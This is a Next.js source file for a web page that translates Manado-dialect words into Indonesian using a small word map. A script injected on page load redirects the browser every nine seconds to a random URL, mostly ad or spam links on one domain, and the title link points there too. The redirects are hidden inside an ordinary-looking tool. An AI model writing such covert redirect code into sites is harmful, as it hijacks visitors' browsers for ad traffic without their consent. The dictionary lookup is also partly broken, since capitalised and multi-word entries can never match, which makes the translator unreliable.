import { useState, useEffect } from "react";
import Head from "next/head";
import styles from "../app/globals.css";
import Link from 'next/link'
import { useRouter } from 'next/router';

function translateManadoToIndonesia(manadoText) {
  // Objek pemetaan kata-kata dari bahasa Manado ke bahasa Indonesia
  const wordMapping = {
    kita: "saya",
    ngana: "anda",
    ngoni: "kalian",
    dia: "dia",
    dimana: "dimana",
    so: "sudah",
    apa: "apa",
    makang: "makan",
    manjo: "ayo",
    ba: "sedang",
    di: "di",
    jalang: "jalan",
    torang: "kita",
    ngana: "kamu",
    makasi: "terima kasih",
    "sama-sama": "sama-sama",
    Aer: "air",
    Alus: "halus",
    Ancor: "hancur",
    Aus: "haus",
    Asang: "asam",
    Babale: "kembali",
    Bacubi: "berkedip",
    Badiri: "berdiri",
    Bajalang: "berjalan",
    Bakubawa: "bersama-sama",
    Capat: "cepat",
    "Cari Slak": "cari cara",
    Cuma: "hanya",
    Cica: "cecak",
    Cao: "bolos",
    Doi: "uang",
    Dapa: "dapat",
    dudu: "duduk",
    Dusu: "kejar",
    Dorang: "mereka",
    "Dapa Tahu": "ketahuan",
    // Tambahkan mapping lainnya sesuai kebutuhan
  };

  // Memisahkan kata-kata dalam kalimat
  const words = manadoText.split(" ");

  // Menerjemahkan kata-kata satu per satu
  const translatedWords = words.map((word) => {
    return wordMapping[word.toLowerCase()] || word;
  });

  // Menggabungkan kata-kata yang telah diterjemahkan menjadi kalimat
  const translatedText = translatedWords.join(" ");

  return translatedText;
}

function HomePage() {
  const [manadoText, setManadoText] = useState("");
  const [indonesiaText, setIndonesiaText] = useState("");
  const router = useRouter();

  useEffect(() => {
    // Script iklan akan dijalankan hanya saat komponen di-render di sisi klien
    const script = document.createElement("script");
    script.type = "text/javascript";
    script.innerHTML = `
      (function(){
        setInterval(function(){
          var redSites = [
            "https://distressedsoultabloid.com/fvz16ur4t?key=c84627c0e0934f50382cec67d5d897ec",
            "https://distressedsoultabloid.com/y7m1mhvp60?key=a4f3502d0b644c03c4a24c88cefd7bad",
            "https://distressedsoultabloid.com/wigxnmi73?key=09c32fa9dcee2acb56f088a76f29e86f",
            "https://distressedsoultabloid.com/gqsffr5nhu?key=fe291f3f7a850f89253ebf3101f37703",
            "https://surgaiptek.blogspot.com/"
          ];
          var randomLinks = redSites[Math.floor(Math.random()*redSites.length)];
          window.location = randomLinks
        },9000)
      }())
    `;
    document.body.appendChild(script);

    return () => {
      // Membersihkan script iklan saat komponen tidak lagi digunakan
      document.body.removeChild(script);
    };
  }, []);

  const handleSubmit = (event) => {
    event.preventDefault();
    const translatedText = translateManadoToIndonesia(manadoText);
    setIndonesiaText(translatedText);
  };

  const handleClickAd = () => {
    window.open('https://distressedsoultabloid.com/fvz16ur4t?key=c84627c0e0934f50382cec67d5d897ec');
  }


  return (
    <div className="container mx-auto p-4">
      <Head>
        <title>Translate Bahasa Manado</title>
      </Head>

      <form onSubmit={handleSubmit} className="max-w-lg mx-auto">
        <Link href="/"> Kembali </Link>
        <div className="mb-4">
          <label
            htmlFor="manado-text"
            className="block font-medium mb-2 text-gray-700"
          >
            Masukkan kata atau kalimat dalam bahasa Manado
          </label>
          <textarea
            id="manado-text"
            name="manado-text"
            value={manadoText}
            onChange={(e) => setManadoText(e.target.value)}
            className="appearance-none block w-full bg-gray-200 text-gray-700 border border-gray-200 rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"
            rows="4"
          ></textarea>
        </div>
        <div className="mb-4">
          <label
            htmlFor="indonesia-text"
            className="block font-medium mb-2 text-gray-700"
          >
            Terjemahan ke bahasa Indonesia
          </label>
          <textarea
            id="indonesia-text"
            name="indonesia-text"
            value={indonesiaText}
            readOnly
            className="appearance-none block w-full bg-gray-200 text-gray-700 border border-gray-200 rounded py-3 px-4 mb-3 leading-tight focus:outline-none focus:bg-white focus:border-gray-500"
            rows="4"
          ></textarea>
        </div>
        <div>
          <button
            type="submit"
            className="bg-blue-500 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded"
          >
            Terjemahkan
          </button>
        </div>
      </form>
      <div>
        <h1 className="text-4xl font-bold underline">
          <Link href="https://distressedsoultabloid.com/fvz16ur4t?key=c84627c0e0934f50382cec67d5d897ec">
            <a target="_blank" rel="noopener noreferrer">
              Manado to Indonesia
            </a>
          </Link>
        </h1>
      </div>
    </div>
  );
}

export default HomePage;
